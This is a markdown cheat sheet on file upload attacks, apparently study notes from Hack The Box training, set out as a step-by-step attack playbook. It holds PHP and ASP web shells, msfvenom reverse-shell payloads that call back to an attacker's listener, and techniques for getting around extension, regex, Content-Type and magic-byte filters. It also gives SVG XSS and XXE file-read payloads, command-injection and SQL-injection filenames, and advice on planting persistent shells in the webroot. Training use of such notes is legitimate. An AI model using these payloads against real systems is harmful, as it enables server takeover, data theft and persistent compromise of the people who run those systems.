# File Upload Attacks

---

## Identify the Stack First

Before uploading anything, figure out what's running:

```bash
# Check index page extension
curl -s http://<IP>:<PORT>/index.php -o /dev/null -w "%{http_code}"
curl -s http://<IP>:<PORT>/index.asp -o /dev/null -w "%{http_code}"
curl -s http://<IP>:<PORT>/index.aspx -o /dev/null -w "%{http_code}"

# Wappalyzer browser extension — instant tech stack fingerprint
# Check Server header
curl -I http://<IP>:<PORT>/

# Fuzz index extension
ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
  -u http://<IP>:<PORT>/indexFUZZ
```

Language → determines shell type. PHP = `.php`, ASP.NET = `.aspx`/`.asp`, Node = JS, Java = `.jsp`.

---

## No Validation — Arbitrary Upload

Upload anything. Test with a canary first:

```bash
echo '<?php echo "Hello HTB"; ?>' > test.php
# Upload via form, visit /uploads/test.php
# If it prints "Hello HTB" → PHP executes → RCE path is open
```

---

## Web Shells

**PHP one-liner (most reliable):**

```php
<?php system($_REQUEST['cmd']); ?>
```

**ASP.NET:**

```asp
<% eval request('cmd') %>
```

Upload, visit the file, pass commands:

```
/uploads/shell.php?cmd=id
/uploads/shell.php?cmd=whoami
/uploads/shell.php?cmd=cat+/etc/passwd
```

Use `CTRL+U` (view-source) in browser — avoids HTML rendering mangling output.

**Full-featured PHP shell:** phpbash — gives terminal UX in browser.

**SecLists shells:** `/opt/useful/seclists/Web-Shells/`

---

## Reverse Shells

**pentestmonkey PHP reverse shell** — edit lines 49/50:

```php
$ip = '<OUR_IP>';
$port = <OUR_PORT>;
```

**msfvenom:**

```bash
msfvenom -p php/reverse_php LHOST=<OUR_IP> LPORT=<OUR_PORT> -f raw > reverse.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<OUR_IP> LPORT=<OUR_PORT> -f raw > reverse.jsp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<OUR_IP> LPORT=<OUR_PORT> -f aspx > reverse.aspx
```

```bash
nc -lvnp <OUR_PORT>
# Upload shell, visit URL, catch connection
```

Reverse shells > web shells — full interactive session, but require outbound connectivity from target. If blocked, fall back to web shell.

---

## Bypassing Client-Side Validation

Validation is in JavaScript — runs in your browser, you control it entirely.

**Method 1: Burp intercept + modify request**

```
# Upload a legit image first, catch in Burp
# Change: filename="HTB.png" → filename="shell.php"
# Change: file content to your webshell
# Forward → "File successfully uploaded"
```

**Method 2: Kill the JS function in DevTools**

```
CTRL+SHIFT+C → click upload element → find: onchange="checkFile(this)"
Double-click "checkFile" in the HTML → delete it → now select any file type
Also remove: accept=".jpg,.jpeg,.png" to make file dialog easier
```

Changes are temporary (client-side only) — enough to bypass and upload.

---

## Bypassing Blacklist Filters

Server rejects known bad extensions (`.php`, `.php7`, `.phps`) — fuzz everything else.

**Fuzz extensions with Burp Intruder:**

```
# Intercept upload, send to Intruder
# Mark the extension in filename="HTB.§php§"
# Payload: PHP extensions wordlist from PayloadsAllTheThings
# Filter by response — different length/message = allowed
```

**PHP execution-capable extensions (commonly missed from blacklists):**

```
.phtml
.php5
.phar
.phps
.pht
.php3
.php4
.shtml
```

Try `.phtml` first — most often forgotten. Upload as `shell.phtml`, visit `/uploads/shell.phtml?cmd=id`.

> [!warning] Blacklist comparison is often case-sensitive. On Windows servers try `shell.pHp`, `shell.PHP`, `shell.Php` — case mismatches bypass the check, file still executes.

---

## Bypassing Whitelist Filters

Whitelist checks the filename contains an allowed extension — regex flaw.

**Vulnerable regex:** `^.*\.(jpg|jpeg|png|gif)` — no `$` anchor, checks if extension exists anywhere.

**Double extension bypass** — pass the check, still execute PHP:

```
shell.jpg.php     # contains .jpg → passes regex, ends with .php → executes
shell.png.php
```

**Strict regex** `^.*\.(jpg|jpeg|png|gif)$` — anchored, only checks final extension. Double extension won't work here. Try reverse instead.

**Reverse double extension** — exploit Apache `FilesMatch` misconfiguration:

```
# /etc/apache2/mods-enabled/php7.4.conf:
# <FilesMatch ".+\.ph(ar|p|tml)">
# If regex has no $ anchor → any file containing .php executes

shell.php.jpg     # ends with .jpg → passes whitelist, contains .php → Apache executes it
```

**Character injection** — fuzz with injected characters between extensions:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
# Fuzz upload with this wordlist
```

Notable: `shell.php%00.jpg` → null byte truncates on PHP < 5.5, server stores `shell.php`.

---

## Bypassing Content-Type Filters

**Content-Type header check** — set by browser from extension, entirely client-side:

```
# Intercept in Burp, change:
Content-Type: application/x-php  →  Content-Type: image/jpeg
# or image/png, image/gif — whatever the app accepts
# Keep filename as shell.php, change Content-Type header only
```

**MIME-Type / magic bytes check** — inspects first bytes of file content:

```bash
# Server uses mime_content_type() — reads actual bytes
# Prepend GIF magic bytes to PHP shell:
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.php
# file shell.php → reports "GIF image data"
# Upload as shell.php → passes MIME check → executes as PHP

# Verify magic bytes locally
echo "GIF8" > test.jpg && file test.jpg
# test.jpg: GIF image data
```

Output will start with `GIF8` before command output — expected, harmless.

**Combined bypass** — both Content-Type header AND MIME-type check active:

```
# Burp: change Content-Type header → image/gif
# File content: GIF8<?php system($_REQUEST['cmd']); ?>
# Filename: shell.php
# Both checks pass, file executes as PHP
```

---

## Limited Upload Attacks (No RCE)

When only safe file types are allowed but the app processes them insecurely.

**XSS via SVG:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Upload `malicious.svg` — when displayed, JS executes in viewer's browser.

**XSS via image EXIF metadata:**

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg | grep Comment
# If app displays metadata → XSS fires
```

**XXE via SVG — read local files:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

**XXE via SVG — PHP source code disclosure:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
# Output = base64 encoded source → decode with: echo '<b64>' | base64 -d
```

---

## Injection in Filename

App uses the filename in OS commands or SQL without sanitization:

```
# Command injection in filename
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
file.jpg;whoami

# XSS in filename (stored, fires when admin views upload list)
<script>alert(window.origin);</script>.jpg

# SQLi in filename (if stored in DB unsanitized)
file';select+sleep(5);--.jpg
```

---

## Upload Path Discovery

When you can upload but don't know where files land:

```bash
# Fuzz common upload directories
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<IP>:<PORT>/FUZZ/ -fc 403

# Force error by uploading duplicate filename — error reveals path
# Upload overly long filename (5000+ chars) — may error out with path
# Use XXE/LFI to read source code and find upload directory

# Check page source after upload for img src, href containing path
```

---

## Attack Decision Tree

```
File upload form found
│
├── No validation at all
│   └── Upload shell.php → visit /uploads/shell.php?cmd=id → RCE
│
├── Client-side validation only
│   ├── Burp: intercept image upload → swap content + filename to shell.php
│   └── DevTools: delete checkFile() from HTML → upload PHP directly
│
├── Blacklist on backend
│   ├── Fuzz extensions → .phtml .php5 .phar .pht .shtml
│   └── Case sensitivity (Windows): .pHp .PHP
│
├── Whitelist on backend
│   ├── Weak regex (no $ anchor) → shell.jpg.php
│   ├── Apache FilesMatch misconfiguration → shell.php.jpg
│   └── Character injection → shell.php%00.jpg (PHP < 5.5)
│
├── Content-Type header check
│   └── Burp: change Content-Type to image/jpeg → keep filename shell.php
│
├── MIME-type / magic bytes check
│   └── Prepend GIF8 to shell: echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.php
│
├── Both Content-Type AND MIME check
│   └── GIF8 magic bytes + change Content-Type header in Burp
│
└── Only safe types allowed (SVG, HTML, XML)
    ├── SVG → XSS payload or XXE for file read / source disclosure
    ├── EXIF → XSS in Comment field via exiftool
    └── Filename injection → command injection / SQLi / XSS
```

---

## Quick Reference — Magic Bytes by Type

```
GIF: GIF8 (ASCII — easiest to use)
PNG: \x89PNG\r\n\x1a\n
JPG: \xff\xd8\xff
PDF: %PDF-

# Check what file thinks your file is
file shell.php
echo "GIF8" > shell.php && file shell.php
```

> [!tip] GIF magic bytes are ASCII-printable — easiest to inject into PHP shell without breaking anything. Always use GIF8 when you need to fake image MIME type.

> [!warning] After getting RCE via web shell, immediately establish a full reverse shell or write a persistent shell to the webroot — web shells get overwritten, sessions timeout, and some servers rotate uploaded files.